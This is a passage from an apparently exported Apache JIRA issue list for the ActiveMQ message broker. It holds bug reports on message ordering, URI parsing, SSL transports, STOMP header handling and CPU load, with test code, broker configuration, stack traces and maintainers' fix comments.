For example, status should return non zero when service is not running, but it returns zero anyway.
{quote}

",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3795,,,,,,,,,,,,,,,,"08/May/12 12:35;carlos;activemq-initd.patch;https://issues.apache.org/jira/secure/attachment/12525989/activemq-initd.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,238544,,,Wed May 09 20:07:11 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahuf:",59164,,,,,,,,,,,,,,,,,,,,,"09/May/12 20:07;tabish;Patch applied, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
browse message may break message order,AMQ-3829,12554112,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,shooeugenesea.tw,shooeugenesea.tw,07/May/12 04:28,08/May/12 01:50,14/Jul/23 05:43,08/May/12 01:50,5.5.1,,,,,5.6.0,,,,,,,0,,,,,,,,,"Test steps:
1. send 3 messages: 1, 2, 3
2. browse message, call: MessageBrowser#nextElement
3. consume message. expect message 1, but fail

public class ActiveMQProblemTest {

    private Queue queue = new ActiveMQQueue(""test"");
    private String url = ""tcp://127.0.0.1:61616"";
    private String username = """";
    private String password = """";
    
    @Test
    public void test() {
        produce();
        browse();
        consume();
    }
    
    private void browse() {
        Connection conn = null;
        Session session = null;
        try {
            conn = newConnection();
            session = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);
            QueueBrowser b = session.createBrowser(queue);
            b.getEnumeration().nextElement();
        } catch (Throwable ex) {
            ex.printStackTrace();
            Assert.fail(ex.getMessage());
        } finally {
            JMSHelper.closeQuietly(conn);
        }
    }
    
    public void produce() {
        Connection conn = null;
        Session session = null;
        try {
            conn = newConnection();
            session = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);
            produce(session, queue, ""1"");
            produce(session, queue, ""2"");
            produce(session, queue, ""3"");
        } catch (Throwable ex) {
            ex.printStackTrace();
            Assert.fail(ex.getMessage());
        } finally {
            JMSHelper.closeQuietly(conn);
        }
    }

    private void produce(Session session, Queue queue, String txt) throws JMSException {
        MessageProducer p = session.createProducer(queue);
        p.send(session.createTextMessage(txt));
        p.close();
    }
    
    public void consume() {
        Connection conn = null;
        Session session = null;
        try {
            conn = newConnection();
            session = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);
            Assert.assertEquals(""1"", receive(queue, session));
            Assert.assertEquals(""2"", receive(queue, session));
            Assert.assertEquals(""3"", receive(queue, session));
        } catch (Throwable ex) {
            ex.printStackTrace();
            Assert.fail(ex.getMessage());
        } finally {
            JMSHelper.closeQuietly(conn);
        }
    }
    
    private String receive(Queue queue, Session session) throws JMSException {
        MessageConsumer consumer = session.createConsumer(queue);
        TextMessage msg = (TextMessage) consumer.receive(1000);
        String result = msg.getText();
        consumer.close();
        return result;
    }

    private Connection newConnection() throws JMSException {
        Connection conn = new ActiveMQConnectionFactory(username, password, url).createConnection();
        conn.start();
        return conn;
    }
}
","Windows 7, ActiveMQ-5.5.1",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,238336,,,Mon May 07 04:33:55 UTC 2012,,,,,,,,,,,"0|i0ahun:",59165,,,,,,,,,,,,,,,,,,,,,"07/May/12 04:33;shooeugenesea.tw;related discussion: http://activemq.2283324.n4.nabble.com/Browsing-and-message-order-td3918428.html#a4614041;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
URISupport incorrectly handles parenthesis,AMQ-3828,12553914,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,barata,barata,04/May/12 11:59,12/Jun/12 21:10,14/Jul/23 05:43,12/Jun/12 21:10,5.5.1,6.0.0,,,,5.7.0,,,Transport,,,,0,CompositeData,parser,URI,,,,,,"URISupport.parseComposite(URI) incorrectly parses an URI with a closing parenthesis "")"" in the query part.

{code}
// The URI is parsed incorrectly when there is an unescaped ')'
URI uri = new URI(""failover://()?updateURIsURL=file:/C:/Dir(1)/a.csv"");
CompositeData data = URISupport.parseComposite(uri);

// Parsed Composite Data:
// - Components: [)?updateURIsURL=file:/C:/Dir(1]
// -   Fragment: null
// -       Host: 
// - Parameters: {}
// -       Path: a.csv
// -     Scheme: failover

// The URI is parsed correctly when it is an escaped
URI uri = new URI(""failover://()?updateURIsURL=file:/C:/Dir%281%29/a.csv"");
CompositeData data = URISupport.parseComposite(uri);
	
// Parsed Composite Data: 
// - Components: []
// -   Fragment: null
// -       Host: 
// - Parameters: {updateURIsURL=file:/C:/Dir(1)/a.csv}
// -       Path: null
// -     Scheme: failover
{code}

I think {{URISupport}} should either throw an URISyntaxException or parse it correctly.
See [RFC2396|http://www.ietf.org/rfc/rfc2396.txt]:
{quote}
Unreserved characters can be escaped without changing the semantics
of the URI, but this should not be done unless the URI is being used
in a context that does not allow the unescaped character to appear.
{quote}

By the way, the problem occurs in the method {{parseComposite(URI uri, CompositeData rc, String ssp)}}, at:

{code}
...
p = ssp.lastIndexOf("")"");
...
{code}",,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,238131,,,Tue Jun 12 21:10:03 UTC 2012,,,,,,,,,,,"0|i0ahuv:",59166,,,,,,,,,,,,,,,,,,,,,"12/Jun/12 21:10;tabish;Fix added along with test additions for this case.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The SslContext definition is not used by the https transport protocol.,AMQ-3827,12553867,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,ccorsi,ccorsi,04/May/12 05:01,09/May/12 09:11,14/Jul/23 05:43,04/May/12 14:18,5.x,,,,,5.7.0,,,Broker,,,,0,patch,,,,,,,,The current https transport protocol does not allow the ability to use the SslContext instance to setup the secure communication for the broker.  The current implementation requires that you define the standard security properties.,All,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/May/12 14:08;ccorsi;activemq-https.xml;https://issues.apache.org/jira/secure/attachment/12525625/activemq-https.xml","04/May/12 05:04;ccorsi;https.diffs;https://issues.apache.org/jira/secure/attachment/12525564/https.diffs",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,238080,,,Fri May 04 14:18:01 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahv3:",59167,,,,,,,,,,,,,,,,,,,,,"04/May/12 05:04;ccorsi;This patch contains the fix that allows a user to use the SslContext instance to setup the https transport protocol.

The patch also includes a test that uses a broker configuration file and one that creates an embedded broker using the api's.
;;;","04/May/12 12:36;tabish;Looks like the patch is missing the file: activemq-https.xml;;;","04/May/12 14:08;ccorsi;Here is the missing configuration file that I missed.
;;;","04/May/12 14:18;tabish;review and tested, patch applied, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AMQ 5.6 Stomp v1.1 support fail to respect the spec and trims all ws from message headers,AMQ-3823,12553518,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,tabish,tabish,01/May/12 18:36,25/Jul/12 11:57,14/Jul/23 05:43,25/Jul/12 11:57,5.6.0,,,,,5.6.0,,,STOMP,,,,0,,,,,,,,,"The Stomp v1.1 spec defines that STOMP severs should no trim ws from message headers:

{quote}
The STOMP 1.0 specification included many example frames with padding in the headers and many servers and clients were implemented to trim or pad header values. This causes problems if applications want to send headers that SHOULD not get trimmed. In STOMP 1.1, clients and servers MUST never trim or pad headers with spaces.
{quote}

",,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,237682,,,Wed Jul 25 11:57:21 UTC 2012,,,,,,,,,,,"0|i0ahvj:",59169,Regression,,,,,,,,,,,,,,,,,,,,"01/May/12 20:54;tabish;Fix applied on trunk;;;","24/Jul/12 11:20;dejanb;We need to keep compatibility with old 1.0 clients and do the trimming in 1.0 case. If someone needs support for non-trimmed headers they should upgrade to Stomp 1.1;;;","25/Jul/12 11:57;dejanb;Fixed with svn revision 1365542;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
high cpu with stomp+nio+ssl and many subscriptions,AMQ-3819,12552652,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,ripienaar,ripienaar,25/Apr/12 13:53,01/May/12 13:29,14/Jul/23 05:43,01/May/12 13:29,5.6.0,,,,,5.6.0,,,STOMP,,,,0,,,,,,,,,"Switching an existing workload from a transport:

{quote}
<transportConnector name=""verified_stompssl""  uri=""stomp+ssl://0.0.0.0:6165?needClientAuth=true""/>
{quote}

to

{quote}
<transportConnector name=""verified_stompssl""  uri=""stomp+nio+ssl://0.0.0.0:6165?needClientAuth=true""/>
{quote}

showed the CPU profile to go from 1-5% to 300% constantly on a 8 core server

I was able to recreate this using a ruby client @ http://devco.net/rip/amq_560_stomp_nio_ssl_tester.rb

The important combinations are:

 * I am connecting to a stomp+nio+ssl port
 * I am creating the subscriptions to the 10 queus and topics

If I change either of these variables - like just commenting out the loop that does those subscriptions - then the CPU load is acceptable.

I analysed the running VM with VisualVM and found that transport.nio.NIOSSLTransport.serviceRead() is the busy thread.  


My activemq.xml is:

{noformat}
<beans
  xmlns=""http://www.springframework.org/schema/beans""
  xmlns:amq=""http://activemq.apache.org/schema/core""
  xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
  xsi:schemaLocation=""http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd
  http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core.xsd
  http://activemq.apache.org/camel/schema/spring http://activemq.apache.org/camel/schema/spring/camel-spring.xsd"">
    <broker xmlns=""http://activemq.apache.org/schema/core"" brokerName=""amq1"" useJmx=""true"" persistent=""true"" schedulePeriodForDestinationPurge=""60000"">
        <destinationPolicy>
          <policyMap>
            <policyEntries>
              <policyEntry topic="">"" producerFlowControl=""false""/>
              <policyEntry queue=""*.reply.>"" gcInactiveDestinations=""true"" inactiveTimoutBeforeGC=""120000"" />
            </policyEntries>
          </policyMap>
        </destinationPolicy>

        <managementContext>
          <managementContext connectorPort=""1099"" jmxDomainName=""org.apache.activemq""/>
        </managementContext>

        <plugins>
          <statisticsBrokerPlugin/>
          <simpleAuthenticationPlugin>
            <users>
              <authenticationUser username=""test"" password=""test"" groups=""admins,everyone""/>
            </users>
          </simpleAuthenticationPlugin>
          <authorizationPlugin>
            <map>
              <authorizationMap>
                <authorizationEntries>
                  <authorizationEntry queue="">"" write=""admins"" read=""admins"" admin=""admins"" />
                  <authorizationEntry topic="">"" write=""admins"" read=""admins"" admin=""admins"" />
                </authorizationEntries>
              </authorizationMap>
            </map>
          </authorizationPlugin>
        </plugins>

        <sslContext>
           <sslContext
                keyStore=""keystore.jks"" keyStorePassword=""ohshahCu""
                trustStore=""truststore.jks"" trustStorePassword=""ohshahCu""
           />
        </sslContext>

        <systemUsage>
          <systemUsage>
            <memoryUsage>
              <memoryUsage limit=""200 mb"" />
            </memoryUsage>
            <storeUsage>
              <storeUsage limit=""1 gb"" />
            </storeUsage>
            <tempUsage>
              <tempUsage limit=""1 gb"" />
            </tempUsage>
          </systemUsage>
        </systemUsage>

        <transportConnectors>
          <transportConnector name=""openwire""  uri=""tcp://0.0.0.0:6166""/>
          <transportConnector name=""stomp+nio"" uri=""stomp+nio://0.0.0.0:6163""/>
          <transportConnector name=""stompssl""  uri=""stomp+ssl://0.0.0.0:6164""/>
          <transportConnector name=""verified_stompssl""  uri=""stomp+nio+ssl://0.0.0.0:6165?needClientAuth=true""/>
        </transportConnectors>
    </broker>

    <import resource=""jetty.xml""/>
</beans>
{noformat}","CentOS 6, RC of 5.6.0

java version ""1.6.0_22""
OpenJDK Runtime Environment (IcedTea6 1.10.6) (rhel-1.43.1.10.6.el6_2-x86_64)
OpenJDK 64-Bit Server VM (build 20.0-b11, mixed mode)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Apr/12 23:02;tabish;StompLoadTest.java;https://issues.apache.org/jira/secure/attachment/12524779/StompLoadTest.java","26/Apr/12 23:02;tabish;StompNIOSSLLoadTest.java;https://issues.apache.org/jira/secure/attachment/12524780/StompNIOSSLLoadTest.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,237002,,,Tue May 01 13:29:37 UTC 2012,,,,,,,,,,,"0|i0ahw7:",59172,,,,,,,,,,,,,,,,,,,,,"26/Apr/12 23:02;tabish;Created a Java version of the test to get the ball rolling.  Didn't completely match the configuration but did notice that if you crank up the number of messages the test sends the test will fail for NIO+SSL and the CPU will be running wild.  Didn't have time to look deeper today.;;;","27/Apr/12 16:02;tabish;Commit test cases on trunk for this scenario, one for each (TCP, SSL, NIO, NIO+SSL).  Only the NIO+SSL version has an issue. ;;;","27/Apr/12 22:22;tabish;The test case seems to indicate that its an issue with the send rate on the connection.  If you slow down the outbound send loop at the end of the test the NIO+SSL test will start passing.  It may be an issue of not properly handling underflow situations in the secureRead method.  When things go wrong it seems like we get into a state of underflow but never try reading from the ssl channel again. ;;;","30/Apr/12 15:38;dejanb;I created a fix in svn revision 1332230 and created a new snapshot

https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.7-SNAPSHOT/

It fixes the problem that transport get stuck in serviceRead() method and from my local test it looks pretty much the same as plain stomp+ssl implementation. Can you take it for a spin and let us know if it improves your use case.;;;","30/Apr/12 15:55;tabish;Tested here with the fix Dejan posted and the NIO+SSL test works as expected now on my machine.  Would be good confirmation to see if that ruby client test is working now. ;;;","30/Apr/12 15:56;ripienaar;Thanks guys, I'll test 'morrow UK time.;;;","01/May/12 11:11;ripienaar;Well done, this has resolved the problem for me.  Tested both with my simple test script and real world workload that first brought up the problem.;;;","01/May/12 13:29;tabish;Testing shows Dejan's fix resolves the issue.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Marshalled properties don't get updated if modified during preProcessDispatch (TraceBrokerPathPlugin looks broken),AMQ-3817,12552203,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,raulvk,raulvk,23/Apr/12 21:31,18/May/12 19:30,14/Jul/23 05:43,18/May/12 19:30,5.5.1,,,,,5.5.1,5.6.0,,Broker,,,,0,marshaling,openwire,plugin,,,,,,"Enabling the TraceBrokerPathPlugin with a custom property name = 'JMSXTrace' sends outdated information to the consumer. When inspecting the property at the consumer code, it has not been updated with the complete broker path. Only the first broker, where the message was produced into, appears. No matter how many brokers are in the route (tested with 4).

Having dug into the code, it looks like marshalledProperties in Message were already set but not dirtied when setProperty was called again from the TraceBrokerPathPlugin. Also, Message.beforeMarshall() assumes that since marshalledProperties is already set, it doesn't need updating. Therefore, the message is dispatched to the consumer with an old version of the properties.

I think Message.setProperty() should check whether marshalledProperties already has a value. If it does, it should re-marshall (i.e. dirty the cache).",,raulvk,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/May/12 11:00;raulvk;amq-tracebrokerpath-fix.diff;https://issues.apache.org/jira/secure/attachment/12528038/amq-tracebrokerpath-fix.diff","18/May/12 11:00;raulvk;amq-tracebrokerpath-testcase.diff;https://issues.apache.org/jira/secure/attachment/12528039/amq-tracebrokerpath-testcase.diff",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,237918,,,Fri May 18 19:30:50 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahwf:",59173,,,,,,,,,,,,,,,,,,,,,"24/Apr/12 13:40;tabish;I recommend you try and create a JUnit test that demonstrates the issue, that way you can ensure that when it gets fixed that it will stay fixed into the future. ;;;","18/May/12 11:00;raulvk;Attached test case and fix.;;;","18/May/12 11:15;raulvk;Please apply fix on 5.5 branch also.
Thanks!;;;","18/May/12 12:54;tabish;You probably don't want to mark this as resolved until someone reviews it and actually commits the patch;;;","18/May/12 19:30;tabish;Patch applied with thanks.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"activemq-core won't deploy in Karaf, missing fusesource imports",AMQ-3812,12551717,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,geerzo,geerzo,20/Apr/12 04:21,16/Jul/12 13:53,14/Jul/23 05:43,24/Apr/12 12:08,5.6.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"When trying to deploy 5.6-SNAPSHOT into Karaf/SMX activemq-core won't resolve due to missing imports. 

org.fusesource.hawtbuf;version=""[1.9,2)"",
org.fusesource.mq.leveldb,
org.fusesource.mqtt.client,
org.fusesource.mqtt.codec



java.lang.Exception: Could not start bundle mvn:org.apache.activemq/activemq-core/5.6-SNAPSHOT in feature(s) activemq-5.6-SNAPSHOT, activemq-1.0-SNAPSHOT: Unresolved constraint in bundle org.apache.activemq.activemq-core [71]: Unable to resolve 71.0: missing requirement [71.0] package; (&(package=org.fusesource.hawtbuf)(version>=1.9.0)(!(version>=2.0.0)))
	at org.apache.karaf.features.internal.FeaturesServiceImpl.installFeatures(FeaturesServiceImpl.java:353)[27:org.apache.karaf.features.core:2.2.4]
	at org.apache.karaf.features.internal.FeaturesServiceImpl$1.run(FeaturesServiceImpl.java:975)[27:org.apache.karaf.features.core:2.2.4]
Caused by: org.osgi.framework.BundleException: Unresolved constraint in bundle org.apache.activemq.activemq-core [71]: Unable to resolve 71.0: missing requirement [71.0] package; (&(package=org.fusesource.hawtbuf)(version>=1.9.0)(!(version>=2.0.0)))
	at org.apache.felix.framework.Felix.resolveBundle(Felix.java:3446)[org.apache.felix.framework-3.0.9.jar:]
	at org.apache.felix.framework.Felix.startBundle(Felix.java:1734)[org.apache.felix.framework-3.0.9.jar:]
	at org.apache.felix.framework.BundleImpl.start(BundleImpl.java:918)[org.apache.felix.framework-3.0.9.jar:]
	at org.apache.felix.framework.BundleImpl.start(BundleImpl.java:905)[org.apache.felix.framework-3.0.9.jar:]
	at org.apache.karaf.features.internal.FeaturesServiceImpl.installFeatures(FeaturesServiceImpl.java:350)[27:org.apache.karaf.features.core:2.2.4]
	... 1 more
",,dejanb,fphilip@houseware.es,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,236524,,,Mon Jul 16 13:53:38 UTC 2012,,,,,,,,,,,"0|i0ahwv:",59175,,,,,,,,,,,,,,,,,,,,,"24/Apr/12 12:08;dejanb;Fixed with svn revision 1329662;;;","31/May/12 20:53;fphilip@houseware.es;Hi
I still have the problem when I use mqtt as a protcol 

<transportConnector name=""mqtt"" uri=""mqtt://localhost:61612""/>

just test a port with telnet localhost 61612 the 
Exception in thread ""ActiveMQ Transport Server Thread Handler: mqtt://localhost:61612"" java.lang.NoClassDefFoundError: org/fusesource/hawtbuf/Buffer
	at org.apache.activemq.transport.mqtt.MQTTTransportFilter.<init>(MQTTTransportFilter.java:52)
	at org.apache.activemq.transport.mqtt.MQTTTransportFactory.compositeConfigure(MQTTTransportFactory.java:44)
	at org.apache.activemq.transport.TransportFactory.serverConfigure(TransportFactory.java:272)
	at org.apache.activemq.transport.mqtt.MQTTTransportFactory.serverConfigure(MQTTTransportFactory.java:56)
	at org.apache.activemq.transport.tcp.TcpTransportServer.handleSocket(TcpTransportServer.java:420)
	at org.apache.activemq.transport.tcp.TcpTransportServer$1.run(TcpTransportServer.java:353)
	at java.lang.Thread.run(Thread.java:680)
Caused by: java.lang.ClassNotFoundException: org.fusesource.hawtbuf.Buffer not found by org.apache.activemq.activemq-core [165]
	at org.apache.felix.framework.ModuleImpl.findClassOrResourceByDelegation(ModuleImpl.java:787)
	at org.apache.felix.framework.ModuleImpl.access$400(ModuleImpl.java:71)
	at org.apache.felix.framework.ModuleImpl$ModuleClassLoader.loadClass(ModuleImpl.java:1768)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:247)

How features or dependecies I should be install to resolve the problem?;;;","16/Jul/12 13:53;dejanb;Fixed with svn revision 1362037

There's now activemq-extra feature that installs all libs needed for mqtt and leveldb

{code}features:install activemq-extra {code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MBeans are not unregistered under WebSphere,AMQ-3807,12551022,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,christian.ohr,christian.ohr,16/Apr/12 07:47,08/Sep/12 10:56,14/Jul/23 05:43,08/Sep/12 10:56,,,,,,5.7.0,,,Broker,JMX,,,0,,,,,,,,,"When running ActiveMQ in embedded mode under WebSphere (I know that this is not a typical JEE-compliant deployment)  the ObjectNames of the registered MBeans are modified by the container. Unfortunately, ActiveMQ fails to keep these names. As a result, ActiveMQ does not unregister its beans when an application is stopped, and a restart causes InstanceAlreadyExistExceptions.

The following change to ManagementContext.java may help:

Currently:

{code}
public ObjectInstance registerMBean(Object bean, ObjectName name) throws Exception {
        ObjectInstance result = getMBeanServer().registerMBean(bean, name);
        this.registeredMBeanNames.add(name);
        return result;
    }
{code}

but it should be something like:

{code}
public ObjectInstance registerMBean(Object bean, ObjectName name) throws Exception {
        ObjectInstance result = getMBeanServer().registerMBean(bean, name);
        if (result != null) this.registeredMBeanNames.add(result.getObjectName);
        return result;
    }
{code}

",WebSphere 7,davsclaus,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/May/12 06:50;christian.ohr;ManagementContext.patch;https://issues.apache.org/jira/secure/attachment/12526310/ManagementContext.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,235886,,,Sat Sep 08 09:46:48 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahx3:",59176,,,,,,,,,,,,,,,,,,,,,"10/May/12 06:50;christian.ohr;added proposed patch;;;","08/Sep/12 09:46;davsclaus;Thanks for reporting.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Partial index updates can lead to bogus recovery for the vmcursor of a Q on startup,AMQ-3806,12550845,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,13/Apr/12 15:36,13/Apr/12 15:45,14/Jul/23 05:43,13/Apr/12 15:45,5.5.1,,,,,5.6.0,,,Broker,Message Store,,,0,,,,,,,,,"seeing{code} INFO | Using Persistence Adapter: org.apache.activemq.store.kahadb.KahaDBStore@49f10a67
INFO | KahaDB is version 4
INFO | Recovering from the journal ...
INFO | Recovery replayed 1 operations from the journal in 0.063 seconds.
INFO | ActiveMQ 5.5.1 JMS Message Broker (..) is starting
INFO | For help or more information please see: http://activemq.apache.org/
INFO | cursor for queue://JMS/XXXXX has recovered 10000 messages. 2147483647% complete
INFO | cursor for queue://JMS/XXXXX has recovered 20000 messages. 2147483647% complete{code}

The crazy % is the result of recovering on a store that has 0 messages. The orderIndex seems to still allow iteration (possibly part of a partial index update) and can result in recovering for ever.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,235709,,,Fri Apr 13 15:45:22 UTC 2012,,,,,,,,,,,"0|i0ahxb:",59177,,,,,,,,,,,,,,,,,,,,,"13/Apr/12 15:45;gtully;fix in http://svn.apache.org/viewvc?rev=1325810&view=rev

the location index, on which the size is based is the index of reference so there is no point iterating if there are no messages. Why the orderindex still has some data is an unknown at this point in this scenario, possibly a partial index update/write.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
duplicate dispatch to durable sub with concurrent send transaction commit and activate,AMQ-3805,12550806,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,13/Apr/12 09:57,20/Apr/12 15:43,14/Jul/23 05:43,20/Apr/12 15:43,5.5.1,,,,,5.6.0,,,Broker,,,,0,duplicate,durable,transaction,,,,,,"A durable sub can get duplicate message dispatches when a large send transaction is committing and the subscription is activated.
